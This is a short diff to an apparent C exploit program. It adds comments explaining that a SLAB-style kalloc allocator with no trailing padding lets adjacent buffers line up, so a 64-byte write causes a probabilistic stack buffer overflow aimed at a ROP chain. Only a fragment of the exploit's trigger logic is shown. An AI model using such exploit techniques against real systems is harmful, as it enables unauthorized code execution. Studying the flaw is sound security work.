@@ -46,7 +46,13 @@ int main() {
 
 		memset(buf, 0x41, 2); // Hello, <input> --> Hello, is 6bytes. 2byte padding for rop.
 
-		// Trigger!		
+		// Trigger!
+		// The vulnerability was, since kalloc is SLAB allocator with no padding after the content,
+		// it can be like,
+		// -----------------------------------------------------------------------
+		// | AAAAAAAA... (64 chars) | AAAAAAA ... (64 chars) | ... (allocations) |
+		// -----------------------------------------------------------------------
+		// So Stack BOF occurs in a probability. It can be deterministic maybe?
 		write(fd, (char *)buf, 64);
 	}
 }
